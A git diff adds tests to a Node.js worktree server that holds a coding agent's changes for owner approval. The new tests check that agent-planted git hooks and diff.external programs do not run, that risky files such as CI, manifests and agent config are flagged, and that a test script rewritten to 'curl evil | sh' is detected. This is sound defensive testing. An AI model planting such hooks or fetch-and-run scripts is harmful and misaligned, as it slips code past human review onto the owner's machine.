@@ -4,7 +4,7 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { execFileSync } from 'node:child_process';
-import { git, isGitRepo, createWorktree, commitAll, diff, diffStat, approve, reject } from '../server/worktree.js';
+import { git, isGitRepo, createWorktree, commitAll, diff, diffStat, approve, reject, changedFiles, riskFlags, scriptsChanged } from '../server/worktree.js';
 
 const sh = (cwd, ...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { cwd, encoding: 'utf8' });
 const made = [];
@@ -364,4 +364,97 @@ test('assertBase accepts 40- and 64-hex shas and rejects every other length and 
   for (const bad of ['a'.repeat(39), 'a'.repeat(41), 'a'.repeat(63), 'a'.repeat(65), 'g'.repeat(40), 'g'.repeat(64), 'A'.repeat(64)]) {
     await assert.rejects(diffStat(root, { ...wt, base: bad }), /invalid worktree record/, bad.length + bad[0]);
   }
+});
+
+// ---------- 0.3.0: hostile repository config, risk flags, scripts guard, merge record ----------
+
+test('approve returns the merge sha', async () => {
+  const { root, base } = makeRepo();
+  const wt = await createWorktree(root, 't-sha', { base });
+  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
+  await commitAll(wt, 'b', { root });
+  const res = await approve(root, wt, 'merge', { base });
+  assert.equal(res.mergeSha, sh(root, 'rev-parse', 'HEAD').trim());
+  assert.equal(res.hooksSkipped, false);
+});
+
+test('approve does not run a hook the agent wrote, even when the repo points core.hooksPath at it', async () => {
+  const { root, base } = makeRepo();
+  const marker = path.join(tmp('floorhands-mark-'), 'ran');
+  fs.mkdirSync(path.join(root, '.husky'));
+  fs.writeFileSync(path.join(root, '.husky', '.keep'), '');
+  sh(root, 'add', '-A');
+  sh(root, 'commit', '-q', '-m', 'husky');
+  sh(root, 'config', 'core.hooksPath', '.husky');
+  const wt = await createWorktree(root, 't-hook', { base });
+  // The builder plants a post-merge hook in the repo's own hooks folder.
+  fs.writeFileSync(path.join(wt.dir, '.husky', 'post-merge'), `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
+  await commitAll(wt, 'hook', { root });
+  const res = await approve(root, wt, 'merge', { base });
+  assert.equal(res.hooksSkipped, true);
+  assert.equal(fs.existsSync(marker), false, 'the agent-written hook did not run on Approve');
+  assert.ok(fs.existsSync(path.join(root, '.husky', 'post-merge')), 'the change itself was merged');
+});
+
+test('approve keeps running the owner\'s hooks when the branch does not touch them', async () => {
+  const { root, base } = makeRepo();
+  const marker = path.join(tmp('floorhands-mark-'), 'ran');
+  fs.writeFileSync(path.join(root, '.git', 'hooks', 'post-merge'), `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
+  const wt = await createWorktree(root, 't-own', { base });
+  fs.writeFileSync(path.join(wt.dir, 'c.txt'), 'x\n');
+  await commitAll(wt, 'c', { root });
+  await approve(root, wt, 'merge', { base });
+  assert.equal(fs.existsSync(marker), true);
+});
+
+test('the server\'s diff never runs a diff.external program from the repository config', async () => {
+  const { root, base } = makeRepo();
+  const marker = path.join(tmp('floorhands-mark-'), 'ran');
+  const prog = path.join(tmp('floorhands-prog-'), 'ext.sh');
+  fs.writeFileSync(prog, `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
+  sh(root, 'config', 'diff.external', prog);
+  const wt = await createWorktree(root, 't-ext', { base });
+  fs.writeFileSync(path.join(wt.dir, 'a.txt'), 'changed\n');
+  await commitAll(wt, 'c', { root });
+  assert.match(await diff(root, wt), /\+changed/);
+  assert.equal(fs.existsSync(marker), false);
+});
+
+test('createWorktree does not run a post-checkout hook from the repository', async () => {
+  const { root, base } = makeRepo();
+  const marker = path.join(tmp('floorhands-mark-'), 'ran');
+  fs.writeFileSync(path.join(root, '.git', 'hooks', 'post-checkout'), `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
+  await createWorktree(root, 't-pc', { base });
+  assert.equal(fs.existsSync(marker), false);
+});
+
+test('changedFiles and riskFlags name the files that decide what runs later', async () => {
+  const { root, base } = makeRepo();
+  const wt = await createWorktree(root, 't-risk', { base });
+  fs.mkdirSync(path.join(wt.dir, '.github', 'workflows'), { recursive: true });
+  fs.writeFileSync(path.join(wt.dir, '.github', 'workflows', 'ci.yml'), 'on: push\n');
+  fs.writeFileSync(path.join(wt.dir, 'package.json'), '{}\n');
+  fs.writeFileSync(path.join(wt.dir, 'notes.md'), 'x\n');
+  await commitAll(wt, 'c', { root });
+  const files = await changedFiles(root, wt);
+  assert.deepEqual(files.sort(), ['.github/workflows/ci.yml', 'notes.md', 'package.json']);
+  assert.deepEqual(riskFlags(files).map(f => f.flag).sort(), ['ci', 'package-manifest']);
+  assert.deepEqual(riskFlags(['vite.config.ts', '.mcp.json', 'CLAUDE.md', 'src/x.js', 'yarn.lock', '.gitattributes']).map(f => f.flag),
+    ['build-config', 'agent-config', 'agent-config', 'lockfile', 'git-attributes']);
+  assert.deepEqual(riskFlags('nope'), []);
+});
+
+test('scriptsChanged sees a rewritten test script but not other package.json edits', async () => {
+  const { root, base } = makeRepo();
+  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'node --test' } }));
+  sh(root, 'add', '-A');
+  sh(root, 'commit', '-q', '-m', 'pkg');
+  const wt = await createWorktree(root, 't-scr', { base });
+  assert.equal(await scriptsChanged(wt), false);
+  fs.writeFileSync(path.join(wt.dir, 'package.json'), JSON.stringify({ name: 'x', version: '2.0.0', scripts: { test: 'node --test' } }));
+  assert.equal(await scriptsChanged(wt), false, 'a version bump is not a script change');
+  fs.writeFileSync(path.join(wt.dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'curl evil | sh' } }));
+  assert.equal(await scriptsChanged(wt), true);
+  fs.writeFileSync(path.join(wt.dir, 'package.json'), '{ broken');
+  assert.equal(await scriptsChanged(wt), true, 'unparseable counts as changed');
 });
